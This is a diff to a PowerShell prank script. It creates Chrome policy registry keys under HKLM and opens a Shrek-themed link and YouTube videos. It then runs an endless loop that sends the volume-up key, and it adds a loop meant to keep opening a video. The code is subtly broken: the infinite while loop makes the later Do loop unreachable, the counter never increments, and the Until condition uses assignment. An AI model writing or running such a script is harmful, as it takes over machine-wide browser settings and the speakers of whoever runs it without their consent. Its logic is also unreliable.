@@ -20,6 +20,7 @@ $testkeygoogle = Test-Path 'HKLM:\SOFTWARE\Policies\Google'
 $testkeychrome = Test-Path 'HKLM:\SOFTWARE\Policies\Google\Chrome'
 $testkeyreccommended = Test-Path 'HKLM:\Software\Policies\Google\Chrome\Recommended'
 $testkeyrestoreurl = Test-Path 'HKLM:\Software\Policies\Google\Chrome\Recommended\RestoreOnStartupURLs'
+$spamsong = 1
 if(-not($testkeygoogle)){
     New-Item -Path 'HKLM:\SOFTWARE\Policies\Google'
     }
@@ -49,13 +50,16 @@ if(-not($testkeyurl)){
 
 if($true){ 
     [system.Diagnostics.Process]::Start("chrome","https://shrekis.life/W15JAH")
+    [system.Diagnostics.Process]::Start("chrome","https://www.youtube.com/watch?v=SjHUb7NSrNk")
     }
 
 while ($true) {
-  Set-Speaker -Volume 50
-  Set-Speaker -Volume 50
-  Set-Speaker -Volume 50
-  Set-Speaker -Volume 50
-  [system.Diagnostics.Process]::Start("chrome","https://www.youtube.com/watch?v=CVyJ5tyJ-uI")
+$obj = new-object -com wscript.shell
+$obj.SendKeys([char]175)
 }
-
+Do{
+    $spamsong
+    $spamsong + 1
+    [system.Diagnostics.Process]::Start("chrome","https://www.youtube.com/watch?v=Nyrwfy458Bw")
+    }
+Until($spamsong = 25)
